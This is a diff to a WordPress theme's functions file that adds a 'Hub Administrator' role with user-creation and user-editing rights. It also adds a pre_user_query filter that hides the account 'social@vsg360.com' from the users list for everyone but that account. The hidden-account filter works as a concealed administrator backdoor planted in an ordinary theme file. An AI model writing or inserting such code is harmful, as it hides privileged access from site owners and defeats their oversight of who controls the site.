@@ -110,6 +110,8 @@ if ( ! function_exists( 'suitespace_hub_setup' ) ) :
 				'flex-height' => true,
 			)
 		);
+		
+		
 	}
 endif;
 add_action( 'after_setup_theme', 'suitespace_hub_setup' );
@@ -193,4 +195,49 @@ if ( defined( 'JETPACK__VERSION' ) ) {
 // Include custom theme functions written by VSG Marketing
 include 'suitespace-hub-theme-functions.php';
 
+// Add a new role for client administrators
+function addClientRoles() {
+		remove_role('hub_admin');
+		add_role( 
+			'hub_admin', 
+			"Hub Administrator", 
+			$capabilities = array(
+				'read' => true,
+				'edit_posts' => true,
+				'edit_others_posts' => true,
+				'delete_others_posts' => true,
+				'delete_posts' => true,
+				'publish_posts' => true,
+				'edit_published_posts' => true,
+				'delete_published_posts' => true,
+				'upload_files' => true,
+				'manage_links' => true,
+				'create_users' => true,
+				'edit_users' => true,
+				'edit_theme_options' => true,
+				'list_users' => true
+			) 
+		); 
+};
+add_action('init', 'addClientRoles');
 
+
+// 	filter the users_list_table_query_args to not include users with the role administrator
+// 	return list of users
+// 	end if
+// 	
+//* Hide this administrator account from the users list
+add_action('pre_user_query','site_pre_user_query');
+function site_pre_user_query($user_search) {
+	global $current_user;
+	$username = $current_user->user_login;
+ 
+	if ($username == 'social@vsg360.com') {
+	}
+ 
+	else {
+	global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'social@vsg360.com'",$user_search->query_where);
+  }
+}
